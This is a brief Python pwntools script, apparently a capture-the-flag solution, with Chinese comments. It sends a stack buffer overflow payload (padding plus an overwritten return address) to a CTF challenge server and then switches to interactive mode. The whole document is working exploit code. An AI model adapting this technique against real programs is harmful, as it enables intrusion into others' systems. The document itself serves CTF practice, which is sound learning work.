from pwn import *
r =remote('pwn.challenge.ctf.show',28197)
offset =0x28
flag_address = 0x08048586
payload = offset * b'a'+ b'bbbb'+ p32(flag_address)
r.sendline(payload)#向程序发送字符串
r.interactive()#改为手工交互